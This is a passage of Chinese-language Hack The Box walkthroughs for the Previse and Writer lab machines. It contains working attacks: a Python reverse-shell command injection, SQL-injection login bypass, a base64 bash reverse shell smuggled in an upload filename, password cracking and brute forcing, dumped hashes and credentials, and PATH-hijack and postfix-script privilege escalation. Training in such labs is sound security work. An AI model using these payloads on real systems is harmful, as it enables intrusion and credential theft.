çœ‹èµ·æ¥ï¼Œè¿™å¾ˆå®¹æ˜“è¢«å‘½ä»¤æ³¨å…¥ ## æ¼æ´åˆ©ç”¨ ç‚¹å‡» MANAGEMENT MENU &gt; LOG DATA &gt; SUBMITä½¿ç”¨burpæŠ“åŒ… delim=comma;python3+-c+&#39;import+os,pty,socket%3bs%3dsocket.socket()%3bs.connect((&quot;10.10.14.110&quot;,4444)) %3b[os.dup2(s.fileno(),f)for+f+in(0,1,2)]%3bpty.spawn(&quot;/bin/bash&quot;)&#39; ä½¿ç”¨ncç›‘å¬ç«¯å£ï¼Œå³å¯getshell (rootğŸ’€root)-[~/Desktop] â””â”€# nc -nvlp 4444 listening on [any] 4444 ... connect to [10.10.14.110] from (UNKNOWN) [10.10.11.104] 56380 bash-4.4$ whoami&amp;&amp;id whoami&amp;&amp;id www-data uid=33(www-data) gid=33(www-data) groups=33(www-data) ç™»å½•mysql bash-4.4$ mysql -u root -p mysql -u root -p Enter password: mySQL_p@ssw0rd!:) show databases; +--------------------+ | Database | +--------------------+ | information_schema | | mysql | | performance_schema | | previse | | sys | +--------------------+ use previse; show tables; +-------------------+ | Tables_in_previse | +-------------------+ | accounts | | files | +-------------------+ select * from accounts; +----+-----------+------------------------------------+---------------------+ | id | username | password | created_at | +----+-----------+------------------------------------+---------------------+ | 1 | m4lwhere | $1$ğŸ§‚llol$DQpmdvnb7EeuO6UaqRItf. | 2021-05-27 18:18:36 | | 2 | robin | $1$ğŸ§‚llol$gBt8as2nJZA5K1YqzaH9Z/ | 2021-08-08 12:38:45 | | 4 | caratortu | $1$ğŸ§‚llol$04L/OghOADV.ufho3gKfY. | 2021-08-08 13:23:42 | | 5 | bobby | $1$ğŸ§‚llol$SyqVySL69GZ.tBbiicFiT/ | 2021-08-08 14:02:50 | | 6 | lucifiel | $1$ğŸ§‚llol$K9wrU9maYCFrqr482bGkS/ | 2021-08-08 17:49:18 | | 7 | 0xrf1606 | $1$ğŸ§‚llol$rObjMowMWOzqMlAz8ZsBc1 | 2021-08-08 18:02:45 | +----+-----------+------------------------------------+---------------------+ é€šè¿‡æŸ¥çœ‹homeç›®å½•ï¼Œå‘ç°m4lwhereè¿™ä¸ªç”¨æˆ·æ˜¯æˆ‘ä»¬éœ€è¦çš„ç”¨æˆ·(å…¶ä»–ç”¨æˆ·éƒ½æ˜¯å…¶ä»–æ­£åœ¨åšè¿™å°é¶æœºçš„äººåˆ›å»ºçš„ï¼ŒåŸºäºHTBçš„è§„åˆ™ï¼Œå’±ä»¬ä¸è¦å½±å“åˆ°å…¶ä»–äºº)ï¼Œå’±ä»¬æŠŠå®ƒçš„hashæ‹¿å»ä½¿ç”¨hashcatæˆ–è€…johnç ´è§£ ### john â”Œâ”€â”€(rootğŸ’€root)-[~/Desktop] â””â”€# john -format=md5crypt-long --wordlist=/usr/share/wordlists/rockyou.txt hash Using default input encoding: UTF-8 Loaded 1 password hash (md5crypt-long, crypt(3) $1$ (and variants) [MD5 32/64]) Will run 2 OpenMP threads Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status ilovecody112235! (?) 1g 0:00:20:20 DONE (2021-08-09 02:51) 0.000819g/s 6073p/s 6073c/s 6073C/s ilovecody31..ilovecody.. Use the &quot;--show&quot; option to display all of the cracked passwords reliably Session completed â”Œâ”€â”€(rootğŸ’€root)-[~/Desktop] â””â”€# john --show hash ?:ilovecody112235! 1 password hash cracked, 0 left hashcatâ”Œâ”€â”€(rootğŸ’€root)-[~/Desktop] â””â”€# hashcat -a 0 -m 500 hash --wordlist /usr/share/wordlists/rockyou.txt -o 123 255 â¨¯ hashcat (v6.1.1) starting... OpenCL API (OpenCL 1.2 pocl 1.5, None+Asserts, LLVM 9.0.1, RELOC, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project] ============================================================================================================================= * Device #1: pthread-Intel(R) Core(TM) i7-6700K CPU @ 4.00GHz, 2868/2932 MB (1024 MB allocatable), 2MCU Minimum password length supported by kernel: 0 Maximum password length supported by kernel: 256 Hashes: 1 digests; 1 unique digests, 1 unique salts Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates Rules: 1 Applicable optimizers applied: * Zero-Byte * Single-Hash * Single-Salt ATTENTION! Pure (unoptimized) backend kernels selected. Using pure kernels enables cracking longer passwords but for the price of drastically reduced performance. If you want to switch to optimized backend kernels, append -O to your commandline. See the above message to find out about the exact limits. Watchdog: Hardware monitoring interface not found on your system. Watchdog: Temperature abort trigger disabled. Host memory required for this attack: 64 MB Dictionary cache hit: * Filename..: /usr/share/wordlists/rockyou.txt * Passwords.: 14344385 * Bytes.....: 139921507 * Keyspace..: 14344385 â”Œâ”€â”€(rootğŸ’€root)-[~/Desktop] â””â”€# cat 123 $1$ğŸ§‚llol$DQpmdvnb7EeuO6UaqRItf.:ilovecody112235! å¾—åˆ°äº†è´¦å·å¯†ç  username = m4lwhere password = ilovecody112235! ä½¿ç”¨sshè¿›è¡Œç™»å½• â”Œâ”€â”€(rootğŸ’€root)-[~/Desktop] â””â”€# ssh m4lwhere@10.10.11.104 m4lwhere@10.10.11.104&#39;s password: Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-151-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage System information as of Sun Aug 8 19:21:55 UTC 2021 System load: 0.4 Processes: 202 Usage of /: 49.2% of 4.85GB Users logged in: 0 Memory usage: 20% IP address for eth0: 10.10.11.104 Swap usage: 0% 0 updates can be applied immediately. Last login: Fri Jun 18 01:09:10 2021 from 10.10.10.5 m4lwhere@previse:~$ whoami&amp;&amp;id m4lwhere uid=1000(m4lwhere) gid=1000(m4lwhere) groups=1000(m4lwhere) m4lwhere@previse:~$ cat user.txt 29e7b0a44a1b8cc46856e3b43ccdcfa4 æˆåŠŸè·å¾—useræƒé™çš„flag ## æƒé™æå‡ ä½¿ç”¨sudo -læŸ¥çœ‹ä¸€ä¸‹m4lwhereç”¨æˆ·çš„sudoæƒé™ m4lwhere@previse:~$ sudo -l [sudo] password for m4lwhere: User m4lwhere may run the following commands on previse: (root) /opt/scripts/access_backup.sh æŸ¥çœ‹ä¸€ä¸‹è¿™ä¸ªæ–‡ä»¶ m4lwhere@previse:~$ cat /opt/scripts/access_backup.sh #!/bin/bash # We always make sure to store logs, we take security SERIOUSLY here # I know I shouldnt run this as root but I cant figure it out programmatically on my account # This is configured to run with cron, added to sudo so I can run as needed - we&#39;ll fix it later when there&#39;s time gzip -c /var/log/apache2/access.log &gt; /var/backups/$(date --date=&quot;yesterday&quot; +%Y%b%d)_access.gz gzip -c /var/www/file_access.log &gt; /var/backups/$(date --date=&quot;yesterday&quot; +%Y%b%d)_file_access.gz ææƒ cd /tmp cat &lt;&lt; EOF &gt; gzip &gt; #!/bin/bash &gt; cp /bin/bash /tmp/c &gt; chmod u+s /tmp/c &gt; EOF chmod +x gzip export PATH=$( pwd ):$PATH sudo /opt/scripts/access_backup.sh ./c -p c-4.4# whoami&amp;&amp;id root uid=1000(m4lwhere) gid=1000(m4lwhere) euid=0(root) groups=1000(m4lwhere) æˆåŠŸææƒåˆ°rootæƒé™ c-4.4# cd /root c-4.4# ls root.txt c-4.4# cat root.txt 76a5854ac1f5d8cb5e1079cb1964dacf æˆåŠŸæ‹¿åˆ°rootæƒé™çš„flag","categories":[],"tags":[{"name":"Hackthebox","slug":"Hackthebox","permalink":"http://www.lucifiel.com/tags/Hackthebox/"}]},{"title":"Writer - Hackthebox","slug":"Hackthebox - Writer","date":"2021-08-06T11:38:36.000Z","updated":"2023-05-20T03:30:36.000Z","comments":true,"path":"2021/08/06/Hackthebox - Writer/","link":"","permalink":"http://www.lucifiel.com/2021/08/06/Hackthebox%20-%20Writer/","excerpt":"","text":"Hackthebox - Writeré¶åœºä¿¡æ¯ é¶åœºç±»å‹ ä¿¡æ¯æœé›†ä½¿ç”¨nmapè¿›è¡Œä¿¡æ¯æœé›† â”Œâ”€â”€(rootğŸ’€root)-[~/Desktop] â””â”€# nmap -A -sS -sC -sV -p- 10.10.11.101 Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-05 03:27 CST Nmap scan report for 10.10.11.101 Host is up (0.23s latency). Not shown: 65531 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 98:20:b9:d0:52:1f:4e:10:3a:4a:93:7e:50:bc:b8:7d (RSA) | 256 10:04:79:7a:29:74:db:28:f9:ff:af:68:df:f1:3f:34 (ECDSA) |_ 256 77:c4:86:9a:9f:33:4f:da:71:20:2c:e1:51:10:7e:8d (ED25519) 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: Story Bank | Writer.HTB 139/tcp open netbios-ssn Samba smbd 4.6.2 445/tcp open netbios-ssn Samba smbd 4.6.2 No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ). TCP/IP fingerprint: OS:SCAN(V=7.91%E=4%D=8/5%OT=22%CT=1%CU=34682%PV=Y%DS=2%DC=T%G=Y%TM=610AEB60 OS:%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=10C%TI=Z%CI=Z%II=I%TS=A)OPS( OS:O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST11 OS:NW7%O6=M54DST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN( OS:R=Y%DF=Y%T=40%W=FAF0%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS OS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R= OS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F= OS:R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T OS:=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD= OS:S) Network Distance: 2 hops Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Host script results: |_clock-skew: 12m51s |_nbstat: NetBIOS name: WRITER, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown) | smb2-security-mode: | 2.02: |_ Message signing enabled but not required | smb2-time: | date: 2021-08-04T19:45:33 |_ start_date: N/A TRACEROUTE (using port 5900/tcp) HOP RTT ADDRESS 1 259.68 ms 10.10.14.1 2 259.76 ms 10.10.11.101 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 298.54 seconds å’±ä»¬å»80ç«¯å£çš„HTTPæœåŠ¡çœ‹ä¸€ä¸‹ åœ¨äººå·¥æŸ¥çœ‹ä»¥åï¼Œæˆ‘å‘ç°å¹¶æ²¡æœ‰ä»€ä¹ˆçªç ´ï¼Œå’±ä»¬å…ˆåšä¸ªç›®å½•fuzzå§ â”Œâ”€â”€(rootğŸ’€root)-[~/Desktop] â””â”€# gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -e -t 100 -u http://10.10.11.101/ =============================================================== Gobuster v3.1.0 by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.11.101/ [+] Method: GET [+] Threads: 100 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.1.0 [+] Expanded: true [+] Timeout: 10s =============================================================== 2021/08/05 04:22:00 Starting gobuster in directory enumeration mode =============================================================== http://10.10.11.101/about (Status: 200) [Size: 3522] http://10.10.11.101/contact (Status: 200) [Size: 4905] http://10.10.11.101/static (Status: 301) [Size: 313] [--&gt; http://10.10.11.101/static/] http://10.10.11.101/logout (Status: 302) [Size: 208] [--&gt; http://10.10.11.101/] http://10.10.11.101/dashboard (Status: 302) [Size: 208] [--&gt; http://10.10.11.101/] http://10.10.11.101/administrative (Status: 200) [Size: 1443] http://10.10.11.101/server-status (Status: 403) [Size: 277] =============================================================== 2021/08/05 04:32:00 Finished =============================================================== å‘ç°æœ‰ä¸€ä¸ª administratortive ç›®å½•ï¼Œå’±ä»¬è¿›å…¥æŸ¥çœ‹ä¸€ä¸‹ æ˜¯ä¸€ä¸ªç™»å½•é¡µé¢ï¼Œæˆ‘æµ‹è¯•äº†ä¸€ä¸‹å¼±å£ä»¤ï¼Œå¹¶ä¸å­˜åœ¨ ç„¶åç»è¿‡æˆ‘å¤§é‡çš„æµ‹è¯•ä»¥åï¼Œå‘ç°è¿™ä¸ªç™»å½•é¡µé¢å­˜åœ¨Sqlæ³¨å…¥ï¼Œä¸”å¯ç”¨ä¸‡èƒ½å¯†ç è¿›è¡Œç™»å½• ## æ¼æ´åˆ©ç”¨ å’±ä»¬å¯¹æ¯”ä¸€ä¸‹è¿™ä¸¤ä¸ªçš„åŒºåˆ«ï¼Œå¯ä»¥å‘ç° admin&#39;order by 6;--+ æ˜¯æ‰§è¡ŒæˆåŠŸäº†ï¼Œæç¤ºå’±ä»¬ Welecome admin ï¼Œæ‰€ä»¥ç¡®å®šå­˜åœ¨æ³¨å…¥ é€šè¿‡è¿›è¡Œç»†è‡´çš„æ‰‹å·¥æ³¨å…¥åå‘ç°ï¼Œè¯¥æ³¨å…¥ç‚¹ç¬¬äºŒé¡¹å¯è¢«æ˜¾ç¤ºå’±ä»¬åˆ©ç”¨è¿™ä¸ªç‚¹æ¥è¿›è¡Œåˆ©ç”¨ ç»è¿‡å¤§é‡çš„æµ‹è¯•åï¼Œå‘ç°è¯¥æ³¨å…¥ç‚¹å¯ç”¨æ¥è¯»å–æ–‡ä»¶ /etc/passwd root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin messagebus:x:103:106::/nonexistent:/usr/sbin/nologin syslog:x:104:110::/home/syslog:/usr/sbin/nologin _apt:x:105:65534::/nonexistent:/usr/sbin/nologin tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin pollinate:x:110:1::/var/cache/pollinate:/bin/false usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin sshd:x:112:65534::/run/sshd:/usr/sbin/nologin systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin kyle:x:1000:1000:Kyle Travis:/home/kyle:/bin/bash lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false postfix:x:113:118::/var/spool/postfix:/usr/sbin/nologin filter:x:997:997:Postfix Filters:/var/spool/filter:/bin/sh john:x:1001:1001:,,,:/home/john:/bin/bash mysql:x:114:120:MySQL Server,,,:/nonexistent:/bin/false å’±ä»¬å»ç™»å½•ä¸€ä¸‹åå°çœ‹ä¸€ä¸‹ï¼Œä½¿ç”¨ä¸‡èƒ½å¯†ç  username = admin&#39;;--+ password = password ç™»å½•æˆåŠŸ æˆ‘å‘ç°è¯¥åå°æœ‰ä¸Šä¼ åŠŸèƒ½ï¼Œä¸è¿‡åªèƒ½ä¸Šä¼ å›¾ç‰‡ ä¸è¿‡æ²¡æœ‰å…³ç³»ï¼Œå’±ä»¬åˆ¶ä½œä¸€ä¸ªå›¾ç‰‡é©¬å°±å¯ä»¥äº† step 1 echo -n &#39;/bin/bash -c &quot;/bin/bash -i &gt;&amp; /dev/tcp/10.10.14.110/9001 0&gt;&amp;1&quot;&#39; | base64 å°†åå¼¹shellçš„è¯­å¥è½¬æ¢ä¸ºbase64æ ¼å¼ step 2 éšä¾¿å‡†å¤‡ä¸€å¼ å›¾ç‰‡ï¼Œæˆ‘è¿™é‡Œå°±ç”¨çš„1.jpg step 3 touch &#39;1.jpg; `echo L2Jpbi9iYXNoIC1jICIvYmluL2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTEwLzkwMDEgMD4mMSI=| base64 -d | bash`;&#39; å°†å›¾ç‰‡å’Œæœ¨é©¬ç»‘å®šåœ¨ä¸€èµ·ï¼Œç”Ÿæˆä¸€ä¸ªå›¾ç‰‡é©¬çš„æ ¼å¼(ä¸¥æ ¼æ„ä¹‰ä¸Šè¯´ä¸æ˜¯å›¾ç‰‡é©¬ï¼Œæ¯•ç«Ÿåªæ˜¯ä¸€ä¸ªåç¼€ç»•è¿‡) step 4 file:///var/www/writer.htb/writer/static/img/1.jpg; `echo L2Jpbi9iYXNoIC1jICIvYmluL2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTEwLzkwMDEgMD4mMSI=| base64 -d | bash`;# ä¸Šä¼ çš„æ—¶å€™æ‰€ä½¿ç”¨çš„æ‰§è¡Œè¯­å¥ step 5 nc -nvlp 9001 ä½¿ç”¨ncç›‘å¬ç«¯å£ ä¸Šé¢æ˜¯ä¸€ä¸ªå¤§è‡´çš„åˆ©ç”¨æ­¥éª¤ï¼Œå’±ä»¬ç°åœ¨æ¥è¯¦ç»†è¿›è¡Œåˆ©ç”¨ é¦–å…ˆå‰ä¸‰æ­¥ç”Ÿæˆå›¾ç‰‡é©¬å°±ä¸è¯´äº†ï¼Œç¨å¾®ä¿®æ”¹ä¸€ä¸‹æŒ‡ä»¤ç„¶åè¾“å…¥å³å¯ åœ¨è¿›å…¥ç¬¬å››æ­¥ä¹‹å‰ï¼Œå’±ä»¬éœ€è¦å…ˆç™»å…¥åå° ç„¶åä¿®æ”¹ä¸€ç¯‡æ–‡ç«  ä¿®æ”¹è¿‡ç¨‹ä¸­ç„¶åä¸Šä¼ æˆ‘ä»¬åˆ¶ä½œçš„æœ¨é©¬ ç„¶åæˆ‘ä»¬ä½¿ç”¨burpè¿›è¡ŒæŠ“åŒ…ï¼Œç„¶åå†è¿›è¡Œä¿®æ”¹ ä¿®æ”¹åä»¥åï¼Œä½¿ç”¨ncç›‘å¬æˆ‘ä»¬æŒ‡å®šçš„ç«¯å£ï¼Œç„¶åæ‰§è¡Œæµé‡åŒ…å³å¯ â”Œâ”€â”€(rootğŸ’€root)-[~/Desktop] â””â”€# nc -nvlp 9001 listening on [any] 9001 ... connect to [10.10.14.110] from (UNKNOWN) [10.10.11.101] 48906 bash: cannot set terminal process group (1061): Inappropriate ioctl for device bash: no job control in this shell www-data@writer:/$ whoami&amp;&amp;id whoami&amp;&amp;id www-data uid=33(www-data) gid=33(www-data) groups=33(www-data) æˆåŠŸè·å¾—ä¸€ä¸ªwww-dataæƒé™çš„shell è‡³äºä¸Šé¢ç”¨åˆ°çš„å›¾ç‰‡çš„è·¯å¾„æ€ä¹ˆå¾—æ¥çš„ï¼Œå’±ä»¬åœ¨ä¹‹å‰çˆ†ç ´çš„æ—¶å€™è·å¾—äº†ä¸€ä¸ª/staticè·¯å¾„ï¼Œè¿›å…¥åå‘ç°å¯ä»¥ç›®å½•éå† http://10.10.11.101/static/img/ å’±ä»¬åœ¨è¿™ä¸ªè·¯å¾„å³å¯çœ‹åˆ°æˆ‘ä»¬ä¸Šä¼ çš„æ–‡ä»¶ï¼Œå†åˆ©ç”¨sqlæ³¨å…¥å¤„çš„æ–‡ä»¶è¯»å–è¯»å–é…ç½®æ–‡ä»¶ï¼Œå³å¯çŸ¥é“ç»å¯¹è·¯å¾„ æš‚æ—¶åœ¨è¿™åˆå¡å£³äº†ï¼ŒæŸ¥çœ‹ä¸€ä¸‹homeç›®å½• www-data@writer:/home$ ls ls john kyle è¿™é‡Œæœ‰ä¸¤ä¸ªæ€è·¯ ä½¿ç”¨hydraçˆ†ç ´kyleçš„å¯†ç  è¯»å–mysqlçš„é…ç½®ï¼Œç›´æ¥è¿›æ•°æ®åº“æ‹¿kyleçš„hash å’±ä»¬å…ˆæ¥çœ‹çœ‹ç¬¬ä¸€ä¸ªï¼Œhydraçˆ†ç ´å¯†ç  â”Œâ”€â”€(rootğŸ’€root)-[~/Desktop] â””â”€# hydra -l kyle -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou-50.txt 10.10.11.101 ssh Hydra v9.1 (c) 2020 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway). Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-08-05 05:16:18 [WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4 [DATA] max 16 tasks per 1 server, overall 16 tasks, 9437 login tries (l:1/p:9437), ~590 tries per task [DATA] attacking ssh://10.10.11.101:22/ [STATUS] 121.00 tries/min, 121 tries in 00:01h, 9318 to do in 01:18h, 16 active [STATUS] 112.33 tries/min, 337 tries in 00:03h, 9102 to do in 01:22h, 16 active [STATUS] 99.71 tries/min, 698 tries in 00:07h, 8741 to do in 01:28h, 16 active [STATUS] 97.27 tries/min, 1459 tries in 00:15h, 7980 to do in 01:23h, 16 active [STATUS] 96.23 tries/min, 2983 tries in 00:31h, 6456 to do in 01:08h, 16 active [STATUS] 96.04 tries/min, 4514 tries in 00:47h, 4925 to do in 00:52h, 16 active [STATUS] 95.70 tries/min, 6029 tries in 01:03h, 3410 to do in 00:36h, 16 active [STATUS] 95.49 tries/min, 7544 tries in 01:19h, 1895 to do in 00:20h, 16 active [STATUS] 95.18 tries/min, 9042 tries in 01:35h, 397 to do in 00:05h, 16 active [22][ssh] host: 10.10.11.101 login: kyle password: marcoantonio 1 of 1 target successfully completed, 1 valid password found [WARNING] Writing restore file because 2 final worker threads did not complete until end. [ERROR] 2 targets did not resolve or could not be connected [ERROR] 0 target did not complete Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-08-05 06:55:10 ç„¶åæ˜¯ç¬¬äºŒä¸ªï¼Œè¿›å…¥æ•°æ®åº“æ‹¿kyleçš„hash www-data@writer:/$ cd /etc/mysql cd /etc/mysql www-data@writer:/etc/mysql$ ls ls conf.d debian-start debian.cnf mariadb.cnf mariadb.conf.d my.cnf my.cnf.fallback www-data@writer:/etc/mysql$ cat mariadb.cnf cat mariadb.cnf # The MariaDB configuration file # # The MariaDB/MySQL tools read configuration files in the following order: # 1. &quot;/etc/mysql/mariadb.cnf&quot; (this file) to set global defaults, # 2. &quot;/etc/mysql/conf.d/*.cnf&quot; to set global options. # 3. &quot;/etc/mysql/mariadb.conf.d/*.cnf&quot; to set MariaDB-only options. # 4. &quot;~/.my.cnf&quot; to set user-specific options. # # If the same option is defined multiple times, the last one will apply. # # One can use all long options that the program supports. # Run program with --help to get a list of available options and with # --print-defaults to see which it would actually understand and use. # # This group is read both both by the client and the server # use it for options that affect everything # [client-server] # Import all .cnf files from configuration directory !includedir /etc/mysql/conf.d/ !includedir /etc/mysql/mariadb.conf.d/ [client] database = dev user = djangouser password = DjangoSuperPassword default-character-set = utf8 æ‹¿åˆ°mysqlæ•°æ®åº“è´¦å·å¯†ç ï¼Œè¿›å…¥æ•°æ®åº“æ‹¿kyleç”¨æˆ·çš„hashå€¼ www-data@writer:/etc/mysql$ mysql -u djangouser -h 127.0.0.1 -p mysql -u djangouser -h 127.0.0.1 -p Enter password: DjangoSuperPassword Reading table information for completion of table and column names You can turn off this feature to get a quicker startup with -A Welcome to the MariaDB monitor. Commands end with ; or \\g. Your MariaDB connection id is 1508 Server version: 10.3.29-MariaDB-0ubuntu0.20.04.1 Ubuntu 20.04 Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others. Type &#39;help;&#39; or &#39;\\h&#39; for help. Type &#39;\\c&#39; to clear the current input statement. MariaDB [dev]&gt; show databases; show databases; +--------------------+ | Database | +--------------------+ | dev | | information_schema | +--------------------+ 2 rows in set (0.001 sec) MariaDB [dev]&gt; use dev; use dev; Database changed MariaDB [dev]&gt; show tables; show tables; +----------------------------+ | Tables_in_dev | +----------------------------+ | auth_group | | auth_group_permissions | | auth_permission | | auth_user | | auth_user_groups | | auth_user_user_permissions | | django_admin_log | | django_content_type | | django_migrations | | django_session | +----------------------------+ 10 rows in set (0.000 sec) MariaDB [dev]&gt; SELECT * FROM auth_user; SELECT * FROM auth_user; +----+------------------------------------------------------------------------------------------+------------+--------------+----------+------------+-----------+-----------------+----------+-----------+----------------------------+ | id | password | last_login | is_superuser | username | first_name | last_name | email | is_staff | is_active | date_joined | +----+------------------------------------------------------------------------------------------+------------+--------------+----------+------------+-----------+-----------------+----------+-----------+----------------------------+ | 1 | pbkdf2_sha256$260000$wJO3ztk0fOlcbssnS1wJPD$bbTyCB8dYWMGYlz4dSArozTY7wcZCS7DV6l5dpuXM4A= | NULL | 1 | kyle | | | kyle@writer.htb | 1 | 1 | 2021-05-19 12:41:37.168368 | +----+------------------------------------------------------------------------------------------+------------+--------------+----------+------------+-----------+-----------------+----------+-----------+----------------------------+ 1 row in set (0.000 sec) æˆåŠŸå¾—åˆ°hashå€¼ pbkdf2_sha256$260000$wJO3ztk0fOlcbssnS1wJPD$bbTyCB8dYWMGYlz4dSArozTY7wcZCS7DV6l5dpuXM4A= ç„¶åä¿å­˜åˆ°æœ¬åœ°æ–‡ä»¶ ä½¿ç”¨johnæˆ–è€…hashcatè¿›è¡Œçˆ†ç ´å³å¯ hashcat -a 0 -m 10000 hash --wordlist /usr/share/wordlists/rockyou.txt æˆåŠŸå¾—åˆ°ç”¨æˆ·kyleçš„è´¦å·å¯†ç  username = kyle password = marcoantonio å’±ä»¬ä½¿ç”¨sshè¿›è¡Œç™»å½• kyle@writer:~$ cat user.txt 70dc74ad2b72d9bf163b98822d6222a9 æˆåŠŸè·å¾—useræƒé™çš„flag ## æƒé™æå‡ å’±ä»¬å‡†å¤‡ä¸¤ä¸ªè„šæœ¬ #!/bin/bash # Localize these. bash -i &amp;&gt;/dev/tcp/10.10.14.110/4444 0&gt;&amp;1 INSPECT_DIR=/var/spool/filter SENDMAIL=/usr/sbin/sendmail # Get disclaimer addresses DISCLAIMER_ADDRESSES=/etc/postfix/disclaimer_addresses # Exit codes from &lt;sysexits.h&gt; EX_TEMPFAIL=75 EX_UNAVAILABLE=69 # Clean up when done or when aborting. trap &quot;rm -f in.$$&quot; 0 1 2 3 15 # Start processing. cd $INSPECT_DIR || { echo $INSPECT_DIR does not exist; exit $EX_TEMPFAIL; } cat &gt;in.$$ || { echo Cannot save mail to file; exit $EX_TEMPFAIL; } # obtain From address from_address=`grep -m 1 &quot;From:&quot; in.$$ | cut -d &quot;&lt;&quot; -f 2 | cut -d &quot;&gt;&quot; -f 1` if [ `grep -wi ^${from_address}$ ${DISCLAIMER_ADDRESSES}` ]; then /usr/bin/altermime --input=in.$$ \\ --disclaimer=/etc/postfix/disclaimer.txt \\ --disclaimer-html=/etc/postfix/disclaimer.txt \\ --xheader=&quot;X-Copyrighted-Material: Please visit http://www.company.com/privacy.htm&quot; || \\ { echo Message content rejected; exit $EX_UNAVAILABLE; } fi $SENDMAIL &quot;$@&quot; &lt;in.$$ exit $? è¿™æ˜¯ä¿®æ”¹åŸæ–‡ä»¶/etc/postfix/disclaimeråå¾—åˆ°çš„è„šæœ¬ï¼Œè¿™é‡Œåªæ˜¯ä¸¾ä¸ªä¾‹å­ï¼Œè¯¥é¶æœºæ— æ³•ä½¿ç”¨bashå’Œshè¿›è¡Œåå¼¹shellã€‚å¯ä»¥ä½¿ç”¨pythonæˆ–socatè¿›è¡Œgetshellï¼Œç”±äºæ‡’ï¼Œæˆ‘å°±ä¸ä¿®æ”¹äº† æŸ¥çœ‹æ–‡ä»¶/etc/postfix/disclaimer_addresseså¾—åˆ°é‚®ç®±kyle@writer.htb ä½¿ç”¨è¯¥é‚®ç®±ç¼–å†™è„šæœ¬ import smtplib host = &#39;127.0.0.1&#39; port = 25 sender_email = &quot;kyle@writer.htb&quot; receiver_email = &quot;kyle@writer.htb&quot; message = &quot;&quot;&quot;\\ Subject: Hi there Test_python_sender.&quot;&quot;&quot; try: server = smtplib.SMTP(host, port) server.ehlo() server.sendmail(sender_email, receiver_email, message) except Exception as e: print(e) finally: server.quit() 